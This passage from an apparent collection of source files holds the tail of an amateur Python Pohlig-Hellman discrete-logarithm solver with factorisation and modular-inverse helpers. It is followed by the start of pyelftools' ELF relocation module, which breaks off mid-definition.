1\t\t\t#O(1)\n\t\telse:\n\t\t\tprint(\"order_status is: \"+str(order_status))\n\t\t\tlhs = 0\n\t\t\tinput(\"Waiting for user..\")\n\t\t\tconcat_order_p = str(order)+\"_\"+str(p)\n\t\t\tq_e_nf_order_p_list.append(concat_order_p)\n\t\treturn count_nosolns, count_order_not_prime, count_q_e_found, count_q_e_not_found, q_e_nf_order_p_list, q, e, order_status, n_prime, count_order_prime, order, lhs\n\t\t\t\t\t\t\t\ndef calc_q_e(primes, order, p):\n\t#print(\"Running calc_q_e()..\"\t\n\t#print(\"Running calc_q_e(primes, \"+str(k)+\", \"+str(p)+\")..\"\n\n\t#Worst: O(n**2+7n+4)\t#Best: O(12)\n\n\t#q needs to be prime, e >= 1 \n\t#p is prime\t\n\n\tresult=False\t\t\t#O(1)\n\tq=0\t\t\t\t#O(1)\n\te=0\t\t\t\t#O(1)\n\tn=1\t\t\t\t#O(1)\n\t#print(\"p is: \"+str(p)\n\t\n\t#***********\n\t#\"What should be used for calculating q & e - pow(prime,n) or pow(prime,n,p)??\")***********\n\n\tfor prime in primes:\t\t#O(n)\t#Worst: O(n**2+7n)\t#Best: O(8)\n\t\t#print(\"==================\"\n\t\tn = 1\t\t\t\t\t\n\t\t#print(\"n is: \"+str(n)+\", order is: \"+str(k) \t\t\n\t\t#print(\"prime is: \"+str(prime)+\", p is: \"+str(prime)\n\t\twhile result is False and prime < p and n <= order and pow(prime,n) <= order:\t#O(n)\t#Worst: O(n+7)\t#Best: O(7)\n\t\t\t#print(\"-----------------\"\n\t\t\t#print(\"n is: \"+str(n)+\", order is: \"+str(order) \n\t\t\t#print(\"prime is: \"+str(prime)+\", p is: \"+str(p)\n\t\t\t#print(\"prime ** n is: \"+str(prime**n)\n\t\t\tif pow(prime,n) == order:\t\t\t\t\t\t\t#O(2)\n\t\t\t\tq = prime\t\t\t\t\t\t#O(1)\n\t\t\t\te = n\t\t\t\t\t\t\t#O(1)\n\t\t\t\tresult = True\t\t\t\t\t\t#O(1)\n\t\t\t\t#print(\"result is: \"+str(result)\t\t\t\t\n\t\t\t\tbreak\t\t\t\t\t\t\t#O(1)\n\t\t\telse:\n\t\t\t\tn = n + 1\t\t\t\t\t\t#O(1)\n\treturn q, e, result\n\ndef exponent_g_p(g, p):\n\t#print(\"Running exponent_g_p()..\"\n\n\t#Worst: O(n + 7)\t#Best: O(8)\n\n\tn=1\t\t\t\t\t\t#O(1)\n\tx=0\t\t\t\t\t\t#O(1)\n\tstatus=False\t\t\t\t\t#O(1)\n\twhile n < p:\t\t\t\t\t#O(n)\t#Worst: O(n + 7)\n\t\t#print(\"n is:\"+str(n)\n\t\tif pow(g,n,p) == 1:\t\t#O(2)\t#Worst: O(6)\n\t\t\tx = n\t\t\t\t#O(1)\n\t\t\tstatus=True\t\t\t#O(1)\n\t\t\tbreak\t\t\t\t#O(1)\n\t\telif pow(g,n,p) == -1:\t\t#O(2)\t#Worst: O(6)\n\t\t\tx = 2 * n\t\t\t#O(1)\n\t\t\tstatus=True\t\t\t#O(1)\n\t\t\tbreak\t\t\t\t#O(1)\n\t\tn = n + 1\t\t\t\t#O(1)\n\n\tif x==0:\t\t\t\t\t#O(1)\n\t\tx=\"No exponent found\"\t\t\t#O(1)\n\t\tstatus=False\t\t\t\t#O(1)\n\n\treturn x, status\n\ndef a_exp_x_eq_r(a,p,r):\n\t#print(\"Running a_exp_x_eq_r(\"+str(a)+\", \"+str(p)+\", \"+str(r)+\"..)\"\n\tx=1\n\tx_values=[]\n\tcount=0\n\tdiff=0\n\tfor x in range(0,2*p):\n\t\t#print(\"count is: \"+str(count)\t\t\n\t\tif pow(a,x,p) == r:\n\t\t\t#print(\"a**x % p is: \"+str(r)\n\t\t\tx_values.append(x)\n\t\t\t#print str(x)+\" appended to x_values\"\n\t\t\tcount=count+1\n\t\t\tif count==2:\n\t\t\t\t#print(\"count is: \"+str(count)\n\t\t\t\t#print str(x)+\" appended to x_values\n\t\t\t\tdiff = x_values[1] - x_values[0]\t\t\t\t\n\t\t\t\t#print(\"diff is: \"+str(diff)\n\t\t\t\tbreak\n\t\t#x = x + 1\n\treturn diff\n\ndef prop_234(g, h, qi, ei, p, count_xi_not_found, count_calc_xi_status_false, lhs):\n\t#print(\"-----------------------------------\"\n\t#print(\"Running prop_234(\"+str(g)+\", \"+str(h)+\", \"+str(qi)+\", \"+str(ei)+\", \"+str(p)+\"..) to solve for x...\"\n\t\n\t#g[var], h[var], qi[var], ei[var], p\n\t#let x = x_0 +x_1*(q)+x_2*(q**2)+...+x_{e-1}q^(e-1), with 0 <= x_i < q, and determine successively x_0, x_1, x_2, ...\n\n\t#print(\"qi is: \"+str(qi)\n\t#print(\"ei is: \"+str(ei)\n\n\t# constuct list of q_powers from 0 to e-1\n\tq_powers=[]\t\t\t\t\t\t#O(1)\n\n\t#when ei > 0: #worst: O(n+3)\t#best: O(3)\n\t#when ei = 0: O(3)\t\n\t#when ei not > 0 nor = 0: O(4)\n\n\t#first q_power will always be 1 (for k=0)\n\tif ei > 0:\t\t\t\t\t\t#O(1)\t#worst: O(n+3)\t#best: O(1)\n\t\tfor k in range(0,ei):\t\t\t\t\t#O(n)\n\t\t\tq_powers.append(pow(qi,k))\t\t\t#O(2)\n\t\t\t#q_powers.append(qi**k)\n\telif ei==0:\t\t\t\t\t\t#O(1)\t#worst: O(3)\n\t\tprint(\"ei = 0!\")\t\t\t\t\t\n\t\tsys.exit()\t\t\t\t\t#O(1)\n\n\telse:\t\t\t\t\t\t\t#O(1)\t#worst: O(4)\n\t\tprint(\"ei is: \",str(ei))\n\t\tsys.exit()\t\t\t\t\t#O(1)\n\n\t#print(\"q_powers are: \"+str(q_powers)\n\n\t#now want to calculate xi using function\t\n\tresult = calc_xi(q_powers, g, p, h, qi, ei, lhs)\n\t#return xi, calc_xi_status, xi_found\t\n\txi = result[0]\n\tcalc_xi_status = result[1]\n\txi_found = result[2]\n\n\t#Subtotal - Worst: O(n**2 + 7n + 3), Best: O(3) when calc_xi_status == False\n\tif calc_xi_status == False:\n\t\tcount_calc_xi_status_false = count_calc_xi_status_false + 1\n\t\t#print(\"Calc_xi_status is false! - g: \"+str(g)+\", p: \"+str(p)+\", h: \"+str(h)+\", qi: \"+str(qi)+\", ei: \"+str(ei)\n\t\tx=0 \t\t\t\t\t\t#O(1)\n\t\tM=0\t\t\t\t\t\t#O(1)\n\t\t#input(\"Calc_xi method failed (lhs=rhs=1). Waiting for user..\")\n\telif xi_found == False:\t\t\t\t#O(1)\n\t\tcount_xi_not_found = count_xi_not_found + 1\n\t\t#print(\"An xi was not found! - g: \"+str(g)+\", p: \"+str(p)+\", h: \"+str(h)+\", qi: \"+str(qi)+\", ei: \"+str(ei)\n\t\tx=0 \t\t\t\t\t\t#O(1)\n\t\tM=0\t\t\t\t\t\t#O(1)\n\t\t#input(\"Calc_xi method failed (lhs=rhs=1). Waiting for user..\")\n\telif calc_xi_status == True and xi_found == True:\t\t#O(1)\t#Subtotal - Worst: O(n**2 + 7n + 2), Best: O(n+5) when only 1 as q_power\n\t\t#print(\"xi are: \"+str(xi)\n\n\t\t#print(\"---------------------------\"\n\t\n\t\t#print(\"q_powers are: \"+str(q_powers)\t\n\t\tfor q_power in q_powers: \t\t\t#O(n)\t#Worst: O(n**2 + 7n)\t#Best: O(n+4) - when only 1 as q_power\n\t\t\t#print(\"q_power is: \"+str(q_power)\n\t\t\t#print(\"index of q_power is: \"+str(q_powers.index(q_power))\n\t\t\t#print(\"xi[(q_powers.index(q_power))] is: \"+str(xi[(q_powers.index(q_power))])\t\t\n\t\t\ta=xi[q_powers.index(q_power)] \t\t\t\t\t\t\t#O(n+1)\n\t\t\tif q_power==1: \t\t\t\t\t\t\t\t\t#O(1)\n\t\t\t\t#print(\"Adding \"+str(xi[q_powers.index(q_power)])+\" to x\"\n\t\t\t\tx = a\t\t\t\t\t\t\t\t\t\t#O(1)\n\t\t\t\t#x = xi[q_powers.index(q_power)]\n\t\t\t\n\t\t\telse:\t\t\t\t\t\t\t\t\t\t#O(1)\n\t\t\t\t#print(\"Adding \"+str(xi[(q_powers.index(q_power))])+\"*\"+str(q_power)+\" to x, and reducing mod \"+str(qi**ei)\n\t\t\t\tx = (x + a * q_power) % pow(qi,ei)\t\t\t\t\t#O(4)\n\t\t\t\t#x = (x + xi[q_powers.index(q_power)]*q_power) % (pow(qi,ei))\t\n\t\t\t\n\t\tM = pow(qi,ei)\t\t\t\t\t#O(1)\n\t\t#print(\"x is: \"+str(x)+\" mod \"+str(M))\t\t\n\telse:\n\t\tprint(\"calc_xi_status is: \"+str(calc_xi_status))\n\t\tprint(\"xi_found are: \"+str(xi_found))\n\t\tinput(\"Waiting for user..\")\n\n\treturn x, M, calc_xi_status, xi_found, count_xi_not_found, count_calc_xi_status_false\n\ndef calc_xi(q_powers, g, p, h, qi, ei, lhs):\n\t#print(\"---------------------------\"\t\t\t\n\t#print(\"Running calc_xi(\"+str(q_powers)+\", \"+str(g)+\", \"+str(h)+\", \"+str(qi)+\", \"+str(ei)+\", \"+str(p)+\") ..\"\t\t\t\t\n\n\t#initialise xi, cumul_q_powers, cumul_xi_q_powers\n\txi = len(q_powers) * [0]\t\t\t\t#O(len(q_powers))\n\tcumul_q_powers=[]\t\t\t\t\t#O(1)\n\tcumul_xi_q_powers=[]\t\t\t\t\t#O(1)\n\tcalc_xi_status=True\t\t\t\t\t#O(1)\n\n\t#Loop through each q_power until xi are calculated\n\tfor q_power in q_powers:\n\t\t#print(\"q_power is: \"+str(q_power)\t\t\n\t\tif calc_xi_status == True:\n\t\t\tif q_power==1:\t\t\t\t\t\t\t#total (incl top lev if) = \n\t\t\t\t#solving for x_0\t\t\n\t\t\t\t#print(\"---------------------------\")\t\t\t\n\t\t\t\txi_found = False\n\t\t\t\t#print(\"Solving for xi[0] ..\")\t\t\t\t\n\t\t\t\t#print(\"q_power is: \"+str(q_power))\t\t\t\t\t\n\t\t\t\t\t\n\t\t\t\t#lhs= pow(g,pow(qi,ei-1),p)\t\t\t\t#O(2)\n\t\t\t\t#lhs= (g**qi**(ei-1)) % p\t\t\t\t\n\t\t\t\t#print(\"lhs is: \"+str(lhs)) \t\t# lhs=76\t\n\t\t\t\t\t\n\t\t\t\trhs= pow(h,pow(qi,ei-1),p)\t\t\t\t#O(2)\n\t\t\t\t#rhs= (h**qi**(ei-1)) % p\t\t\t\t\n\t\t\t\t#print(\"rhs is: \"+str(rhs)) \t\t# rhs=1\t\t\n\t\t\t\n\t\t\t\tif lhs ==1 and rhs ==1:\t\t\t\t\t#O(1)\t\t#subtotal: O(2)\t#section= O(2n+6)\t\t\t\t\n\t\t\t\t\t#This method seems to fail for this instance. Try p-1/q method?? brute force search instead??\t\t\t\t\n\t\t\t\t\tcalc_xi_status=False\t\t\t\t#O(1)\n\n\t\t\t\telse:\t\t\t\t\t\t\t#O(1)\t\t#Worst: O(4n+1)\t#best: O(6)\n\t\t\t\t\tfor t in range(0, qi):\t\t\t\t#O(n)\t\t#Worst: O(4n)\t#best: O(5)\n\t\t\t\t\t\tif pow(lhs,t,p) == rhs:\t\t\t#O(2)\t\t#Worst: O(4)\t#best: O(4)\n\t\t\t\t\t\t#if lhs**t % p ==rhs:\t\t\t\t\t\n\t\t\t\t\t\t\txi[0]=t  # xi[0]=\t\t#O(1)\n\t\t\t\t\t\t\txi_found = True\n\t\t\t\t\t\t\t#print(\"xi[0] is: \"+str(t)\t\n\t\t\t\t\t\t\tbreak\t\t\t\t\n\n\t\t\t\tif calc_xi_status == True:\t\t\t\t#O(1)\t\t#subtotal= O(3)\n\t\t\t\t\tcumul_xi_q_powers.append(xi[0])\t\t\t#O(1)\n\t\t\t\t\tcumul_q_powers.append(1)\t\t\t#O(1)\n\t\t\t\t\t#print(\"cumul_xi_q_powers after append: \"+str(cumul_xi_q_powers)\n\t\t\t\t\t#print(\"cumul_q_powers after append: \"+str(cumul_q_powers)\n\t\t\telse:\t\t\t\t\t\t\t\t#O(1)\t\t#total (incl top lev if) = \n\t\t\t\t#solving for x_n (n!=0)\n\t\t\t\t#print(\"---------------------------\")\t\t\t\n\t\t\t\txi_found = False\n\t\t\t\t#print(\"solving for x_n (n!=0)..\"\t\t\t\n\t\t\t\t#print(\"q_power is: \"+str(q_power))\t\t\t\n\t\t\t\txi_number = q_powers.index(q_power)\t\t\t#O(n)\n\t\t\t\t#print(\"Solving for xi[\"+str(xi_number)+\"] ..\")\n\t\t\t\t#print(\"cumul_xi_q_powers before append: \"+str(cumul_xi_q_powers)\n\t\t\t\t#print(\"cumul_q_powers before append: \"+str(cumul_q_powers)\n\t\t\t\n\t\t\t\t#print(\"g is: \"+str(g) # g=\n\t\t\t\t#print(\"h is: \"+str(h) # h=\n\t\t\t\ta = xi_number-1\t\t\t\t\t\t#O(1)\n\t\t\t\t#print(\"xi[\"+str(a)+\"] is: \"+str(xi[a])) # xi[0]=0\t\n\t\t\t\n\t\t\t\t#print(\"qi is: \"+str(qi))\t#qi = \n\t\t\t\t#print(\"ei is: \"+str(ei))\t#ei = \n\t\t\t\n\t\t\t\t#print(\"cumul_xi_q_powers is: \"+str(cumul_xi_q_powers)\t\n\t\t\t\t#print(\"cumul_q_powers is: \"+str(cumul_q_powers)\t\t\n\t\t\t\n\t\t\t\tz=0\n\t\t\t\tfor cumul_xi_q_power in cumul_xi_q_powers:\t\t#O(n+1)\n\t\t\t\t\tz = z + cumul_xi_q_power\n\t\t\t\t\n\t\t\t\t#print(\"sum_cumul_xi_q_power is now: \"+str(z)\t\t\n\n\t\t\t\tif xi[xi_number-1] >= 0:\n\t\t\t\t\t#need to work out what g**-[x_0+x_1*q_power+x_2*q_power**2 + ...], mod p is!!!\n\t\t\t\t\t#print(\"xi[\"+str(xi_number-1)+\"] >= 0\")\n\t\t\t\t\t#print(\"Calculating modular inverse of \"+str(g)+\"**\"+str(-z)+\", mod \"+str(p))\t\t\t\n\t\t\t\t\t#print(\"Calculating modular inverse of \"+str(g)+\"**\"+str(-xi[xi_number-1])+\", mod \"+str(p))\t\t\t\t\n\t\t\t\t\tb = calc_modinverse(g, z, p)\t\t\t\t\t\t\t\t\t#O(n+5)\n\t\t\t\t\t#b = calc_modinverse(g, xi[xi_number-1], p) #b = \n\t\t\t\t\t#print(\"inverse is: \"+str(b)) #b = \t\t\t\t\t\t\t\t\n\t\t\t\t\n\t\t\t\t\t#(ei - xi_number - 1)\n\n\t\t\t\t\t#print(\"(h * b)**qi**(ei - xi_number - 1) % p is: \"+str((h * b)**qi**(ei - xi_number - 1) % p)\n\t\t\t\t\trhs = pow(h * b,pow(qi,ei - xi_number - 1),p)\n\t\t\t\t\t#rhs = (h * b)**qi**(ei - xi_number - 1) % p\t\t\t\t\t\t#O(2n+2)\t\t\t\n\n\t\t\t\t\t#print(\"rhs is: \"+str(rhs))\t\t\t\t\t\t\t\t\n\n\t\t\t\t\tif lhs == 1 and rhs == 1:\t\t\t\t\t\t\t\t\t#O(1)\t#Subtotal O(4)\n\t\t\t\t\t\tprint(\"lhs == 1 and rhs == 1\")\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t#print(\"xi[\"+str(xi_number-1)+\"] >= 0, lhs=1, rhs=1, g: \"+str(g)+\" p: \"+str(p)+\" h: \"+str(h))\t\t\t\n\t\t\t\t\t\tcalc_xi_status=False\t\t\t\t\t\t\t\t\t#O(1)\n\t\t\t\t\t\tprint(\"Calc_xi method failed. h is \"+str(h)+\", p is \"+str(p)+\", qi is \"+str(qi)+\", ei is \"+str(ei)+\", xi_number is \"+str(xi_number))\t\t\t\t\t\t\t\t\t\t\t\t\t\t#O(1)\n\t\t\t\t\t\tsys.exit()\n\t\t\t\t\telse:\t\t\t\t\t\t\t\t\t\t\t\t#O(1)\t#Subtotal O(n**2+5n+1)\n\t\t\t\t\t\tfor t in range(0, qi):\t\t\t\t\t\t\t\t\t#O(n)\n\t\t\t\t\t\t\t#print(\"t is now: \"+str(t)\t\t\t\t\t\n\t\t\t\t\t\t\t#print(str(lhs)+\"**\"+str(t)+\" % \"+str(p)+\" is: \"+str(lhs**t % p))\n\t\t\t\t\t\t\tif lhs**t % p == rhs:\t\t\t\t\t\t\t\t#O(n+2)\n\t\t\t\t\t\t\t\txi[xi_number]=t\t\t\t\t\t\t\t\t\t#O(1)\n\t\t\t\t\t\t\t\txi_found = True\n\t\t\t\t\t\t\t\t#print(\"xi[\"+str(xi_number)+\"] is: \"+str(t)\t\t\t\t\t\n\t\t\t\t\t\t\t\tbreak\t\t\t\t\t\t\t\t\t\t#O(1)\n\n\t\t\t\t\tif calc_xi_status == True:\t\t\t\t\t\t\t\t\t#O(1)\t#Subtotal O(n**2+5n+1)\n\t\t\t\t\t\tcumul_xi_q_powers.append(q_power * xi[xi_number])\t\t\t\t\t\t#O(3)\n\t\t\t\t\t\t#print(\"Appended \"+str(q_power * xi_number)+\" to cumul_xi_q_powers\")\n\t\t\t\t\t\tcumul_q_powers.append(q_power)\t\t\t\t\t\t\t\t\t#O(1)\n\t\t\t\t\t\t#print(\"Appended \"+str(q_power)+\" to cumul_q_powers\")\n\t\t\t\t\t\t#print(\"xi[\"+str(xi_number)+\"] is: \"+str(xi[xi_number]))\n\t\t\t\t\t\t#print(\"xi are now:\"+str(xi)\n\t\t\t\t\t\t#print(\"cumul_xi_q_powers after append: \"+str(cumul_xi_q_powers)\n\t\t\t\t\t\t#print(\"cumul_q_powers after append: \"+str(cumul_q_powers)\n\t\t\t\telse:\t\t\t\t\t\t\t\t\t\t\t\t\t#O(1)\n\t\t\t\t\tprint(\"xi[\"+str(xi_number-1)+\"] is negative !!! CHECK\")\t\t\t\t\t\t\t\n\t\t\t\t\t#input(\"Waiting for user..\")\t\t\t\t\t\t\t\t\t\t#O(1)\n\t\t\t\t\tsys.exit()\t\t\t\t\t\t\t\t\t\t\t\t#O(1)\n\t\t\n\t\t\t\t#print(\"lhs is: \"+str(lhs)\n\t\t\t\t#print(\"rhs is: \"+str(rhs)\n\n\t\t\t\t#print(\"rhs is: \"+str(rhs))\n\t\t\t\t#print(\"qi is: \"+str(qi)\n\treturn xi, calc_xi_status, xi_found\n\ndef calc_modinverse(g, power, p):\n\t#print(\"----------------\"\n\t#print(\"Running calc_modinverse()..\"\t\t\t\t\t#O(1)\n\t#print(\"g is: \"+str(g)\n\t#print(\"power is: \"+str(power)\n\t\n\tfloor_sqrt_p = math.floor(math.sqrt(p))\t\t\t\t\t#O(2)\n\n\t#this only works for p being prime!\t\n\tif isprime(p) == True:\t\t\t\t\t\t\t#O(1)\t#Subtotal O(2n+4)\n\t#if isprime(p,floor_sqrt_p) == 0:\t\n\t\tresult=g**(p-2)% p\t\t\t\t\t\t#O(n+2)\t#Subtotal O(2n+3)\n\t\t#print str(g)+\"**(-1) mod \"+str(p)+\" is: \"+str(result)\n\t\tc = result**power % p\t\t\t\t\t\t#O(n+1)\n\t\t#print(\"c is: \"+str(c)\t\n\t\t#print str(g)+\"**(-\"+str(power)+\") mod \"+str(p)+\" is: \"+str(c)\n\telse:\n\t\t#p is not prime!\n\t\t#print(\"p: \"+str(p)+\" is not prime!\"\n\t\tc = modinv(g, p)\t\t\t\t\t\t#O(n)\n\t\t#return x % m\n\t\t#print(\"inverse is: \"+str(c)\t\t\n\n\t\t#input(\"Waiting for user..\")\t\n\treturn c\n\ndef calc_powers(factors):\n\t#Worst: O(n+13)\t#Best: O(18)\n\n\t#print(\"Running calc_powers..\"\n\t#Now want to find max powers m for each factor in factors.\n\t#can do this by counting unique factors\t\t\t\n\tprime_factors=[]\t\t\t\t\t#O(1)\n\tpowers = []\t\t\t\t\t\t#O(1)\n\tfac_list = []\t\t\t\t\t\t#O(1)\n\tcount = 0\t\t\t\t\t\t#O(1)\n\tc_primefactors_powers = 0\t\t\t\t#O(1)\n\ts_before_calc_powers = time.clock()\t\t\t#O(1)\n\tfor factor in factors:\t\t\t\t\t#O(n)\t#Worst: O(n**2 + 2n)\t#Best: O(???)\n\t\t#print(\"------------------\"\t\n\t\t#print(\"factor is: \"+str(factor)\t\t\n\t\tif fac_list:\t\t\t\t\t\t#O(1)\t#Worst: O(n+2)\t#Best: O(4)\n\t\t\t#temp factor list for comparisons has values\n\t\t\tif factor in fac_list:\t\t\t\t\t#O(n)\t#Worst: O(n+1)\t#Best: O(6)\n\t\t\t\t#print str(factor)+\" is in fac_list\"\n\t\t\t\tcount += 1\t\t\t\t\t\t#O(1)\n\t\t\t\t#print(\"count is: \"+str(count)\n\t\t\t\t#temp_factor, temp_count = factor, count\n\t\t\t\t#print temp_factor, temp_count\n\t\t\telse:\t\t\t\t\t\t\t#O(1)\n\t\t\t\t#factor is not in fac_list\n\t\t\t\t#add factor to prime_factors\n\t\t\t\tprime_factors.append(factor)\t\t\t\t#O(1)\n\t\t\t\t#print(\"Added \"+str(factor)+\" to prime_factors\"\n\t\t\t\t#print(\"prime_factors is: \"+str(prime_factors)\n\t\t\t\t#add current count to powers for previous factor\n\t\t\t\t#print(\"count is: \"+str(count)\n\t\t\t\tpowers.append(count)\t\t\t\t\t#O(1)\n\t\t\t\t#print(\"Added \"+str(count)+\" to powers for previous factor\"\n\t\t\t\t#count = 0\n\t\t\t\t#print str(factor)+\" is NOT in fac_list\"\n\t\t\t\t#append it\t\t\t\t\n\t\t\t\tfac_list.append(factor)\t\t\t\t\t#O(1)\n\t\t\t\t#count += 1\n\t\t\t\tcount = 1\t\t\t\t\t\t#O(1)\n\t\t\t\t#print(\"count is: \"+str(count)\n\t\t\t\t#print(\"fac_list is: \"+str(fac_list)\n\t\t\t\t\n\t\telse:\t\t\t\t\t\t\t\t#O(1)\t#Subtotal: O(4)\n\t\t\t#temp factor list for comparisons is empty\n\t\t\t#store 1st factor\n\t\t\t#print(\"fac_list is empty\"\n\t\t\tfac_list.append(factor)\t\t\t\t\t\t#O(1)\n\t\t\t#print str(factor)+\" added to fac_list\"\n\t\t\tprime_factors.append(factor)\t\t\t\t\t#O(1)\n\t\t\t#print(\"Added \"+str(factor)+\" to prime_factors\"\n\t\t\t#print(\"prime_factors is: \"+str(prime_factors)\t\t\t\n\t\t\tcount += 1\t\t\t\t\t\t\t#O(1)\n\t\t\t#print(\"count is: \"+str(count)\t\n\n\t#add count to powers for the last factor and the last factor\n\tpowers.append(count)\n\t#print(\"Added \"+str(count)+\" to powers for previous factor\"\n\t\n\t#print(\"prime_factors are: \"+str(prime_factors)\n\t#print(\"powers are: \"+str(powers)\n\n\tc_calc_powers = time.clock() - s_before_calc_powers\n\n\treturn prime_factors, powers, c_calc_powers\n\ndef csvfile_store_primes(csv_filename_var):\t\t### Assumming O(n+len(z1)+1) ### \n\t\t\n\twith open(csv_filename_var,'r') as csvfile:\n\t\t# Strip quotes, eol chars etc, and convert strings to integers\n\t\t#Use generator to get number of primes to use in prime file..\n\t\tz1=(int(x) for row in csv.reader(csvfile) for x in row)\t\t\t#O(n) - Potentially y rows and x items in each row, \n\t\t\t\t\t\t\t\t\t\t\t# however only 1 row in csvfile being used. Hence x*y=x items to store\n\t\tprimes=list(z1)\t\t\t\t\t\t\t\t#O(len(z1))\n\t\tcsvfile.close()\t\t\t\t\t\t\t\t#O(1 ???)\n\treturn primes\n\ndef factorise(N):\t\t\n\t#based on code on https://stackoverflow.com/questions/16996217/prime-factorization-list/\n\t#Author states this is is O(sqrt(n))) and 2 to 3 times faster than trial division in practice\n\t#Wheel factorization, which uses a cyclic set of gaps between potential primes to greatly\n\t#reduce the number of trial divisions.\n\t#uses a 2,3,5-wheel\n\n\t#print(\"Running factorise(\"+str(N)+\")..\"\t\n\n\t#Create lists to hold prime factors of N and corresponding powers\n\tfactors = []\t\t\t\t\t#O(1)\n\n\t#print(\"Calculating prime factors and powers\"\n\ts_before_factorisations = time.clock()\t\t\n\t\t\n\tgaps=[1,2,2,4,2,4,2,4,6,2,6]\t\t\t#O(1)\n\tlength, cycle = 11,3\t\t\t\t#O(1)\n\tf, factors, next = 2, [], 0\t\t\t#O(1)\n\twhile f*f <= N:\t\t\t\t\t#O(n)\n\t\twhile N % f == 0:\t\t\t\t#O(n)\n\t\t\t#f is a factor. Add factor f to fs\n\t\t\tfactors.append(f)\t\t\t\t#O(1)\n\t\t\tN /= f\t\t\t\t\t\t#O(1)\n\t\tf += gaps[next]\t\t\t\t#O(1)\n\t\tnext += 1\t\t\t\t#O(1)\n\t\tif next == length:\t\t\t#O(1)\n\t\t\tnext = cycle\t\t\t\t#O(1)\n\tif N > 1: factors.append(N)\n\t\t\n\tc_factorisations = time.clock() - s_before_factorisations\t#O(1)\n\n\treturn factors, c_factorisations\t\t#O(1)\n\ndef size_input_check(input_number):\n\n\t#if size of number >= 2*10^8 then return message about memory & exit\n\tif input_number>2*(10**8):\n\t\tprint('Number to attempt to factorise is too large for this program. Try a number <= 2x10^8. Exiting to avoid memory issues..')\n\t\tsys.exit()\n\nif __name__=='__main__':\n\tmain()\n\ndef egcd(a, b):\t\t\t\t\t\t\t#O(n)\n\t#print(\"Running egcd(\"+str(a)+\",\"+str(b)+\")\")\n\t#print(\"a is: \"+str(a)\n\t#print(\"b is: \"+str(b)\t\n\tif a == 0:\t\t\t\t\t\t#O(1)\t#Subtotal: O(2)\n\t\treturn (b, 0, a)\t\t\t\t#O(1)\n\tg, y, x = egcd(b % a, a)\t\t\t\t\n\t#print(\"egcd(\"+str(a)+\",\"+str(b)+\") is: \"+str(g)+\" \"+str(x - (b//a) * y)+\" \"+str(y))\n\treturn (g, x - (b//a) * y, y)\n\ndef modinv(a, m):\t\t\t\t\t\t#### O(n+5) ###\n\t#print(\"Running modinv(\"+str(a)+\",\"+str(m)+\")\")\t\t\n\t#print(\"a is: \"+str(a)\n\t#print(\"m is: \"+str(m)\t\n\t#egcd(a, m)\n\tg, x, y = egcd(a, m)\t\t\t\t\t#O(n)\n\tif g != 1:\t\t\t\t\t\t\t#O(1)\t#Subtotal: O(2)\n\t\traise Exception('No Modular Inverse') \t\t\t#O(1)\n\t#print(str(a)+\"**(-1) mod \"+str(m)+\" is: \"+str(x % m))\t\n\treturn x % m\t\t\t\t\t\t#O(1)\n\n", "573": "#-------------------------------------------------------------------------------\n# elftools: elf/relocation.py\n#\n# ELF relocations\n#\n# Eli Bendersky (eliben@gmail.com)\n# This code is in the public domain\n#-------------------------------------------------------------------------------\nfrom collections import namedtuple\n\nfrom ..common.exceptions import ELFRelocationError\nfrom ..common.utils import elf_assert, struct_parse\nfrom .sections import Section\nfrom .enums import ENUM_RELOC_TYPE_i386, ENUM_RELOC_TYPE_x64\n\n\nclass Relocation(object):\n    \"\"\" Relocation object - representing a single relocation entry. Allows\n        dictionary-like access to the entry's fields.\n\n        Can be either a REL or RELA relocation.\n    \"\"\"\n    def __init__(self, entry, elffile):\n        self.entry = entry\n        self.elffile = elffile\n        \n    def is_RELA(self):\n        \"\"\" Is this a RELA relocation? If not, it's REL.\n        \"\"\"\n        return 'r_addend' in self.entry\n        \n    def __getitem__(self, name):\n        \"\"\" Dict-like access to entries\n        \"\"\"\n        return self.entry[name]\n\n    def __repr__(self):\n        return '' % (\n                'RELA' if self.is_RELA() else 'REL',\n                self.entry)\n\n    def __str__(self):\n        return self.__repr__()\n\n\nclass RelocationSection(Section):\n    \"\"\" ELF relocation section. Serves as a collection of Relocation entries.\n    \"\"\"\n    def __init__(self, header, name, stream, elffile):\n        super(RelocationSection, self).__init__(header, name, stream)\n        self.elffile = elffile\n        self.elfstructs = self.elffile.structs\n        if self.header['sh_type'] == 'SHT_REL':\n            expected_size = self.elfstructs.Elf_Rel.sizeof()\n            self.entry_struct = self.elfstructs.Elf_Rel\n        elif self.header['sh_type'] == 'SHT_RELA':\n            expected_size = self.elfstructs.Elf_Rela.sizeof()\n            self.entry_struct = self.elfstructs.Elf_Rela\n        else:\n            elf_assert(False, 'Unknown relocation type section')\n\n        elf_assert(\n            self.header['sh_entsize'] == expected_size,\n            'Expected sh_entsize of SHT_REL section to be %s' % expected_size)\n\n    def is_RELA(self):\n        \"\"\" Is this a RELA relocation section? If not, it's REL.\n        \"\"\"\n        return self.header['sh_type'] == 'SHT_RELA'\n\n    def num_relocations(self):\n        \"\"\" Number of relocations in the section\n        \"\"\"\n        return self['sh_size'] // self['sh_entsize']\n\n    def get_relocation(self, n):\n        \"\"\" Get the relocation at index #n from the section (Relocation object)\n        \"\"\"\n        entry_offset = self['sh_offset'] + n * self['sh_entsize']\n        entry = struct_parse(\n            self.entry_struct,\n            self.stream,\n            stream_pos=entry_offset)\n        return Relocation(entry, self.elffile)\n\n    def iter_relocations(self):\n        \"\"\" Yield all the relocations in the section\n        \"\"\"\n        for i in range(self.num_relocations()):\n            yield self.get_relocation(i)\n\n\nclass RelocationHandler(object):\n    \"\"\" Handles the logic of relocations in ELF files.\n    \"\"\"\n    def __init__(self, elffile):\n        self.elffile = elffile\n\n    def find_relocations_for_section(self, section):\n        \"\"\" Given a section, find the relocation section for it in the ELF\n            file. Return a RelocationSection object, or None if none was\n            found.\n        \"\"\"\n        reloc_section_names = (\n                b'.rel' + section.name,\n                b'.rela' + section.name)\n        # Find the relocation section aimed at this one. Currently assume\n        # that either .rel or .rela section exists for this section, but\n        # not both.\n        for relsection in self.elffile.iter_sections():\n            if (    isinstance(relsection, RelocationSection) and\n                    relsection.name in reloc_section_names):\n                return relsection\n        return None\n        \n    def apply_section_relocations(self, stream, reloc_section):\n        \"\"\" Apply all relocations in reloc_section (a RelocationSection object)\n            to the given stream, that contains the data of the section that is\n            being relocated. The stream is modified as a result.\n        \"\"\"\n        # The symbol table associated with this relocation section\n        symtab = self.elffile.get_section(reloc_section['sh_link'])\n        for reloc in reloc_section.iter_relocations():\n            self._do_apply_relocation(stream, reloc, symtab)\n\n    def 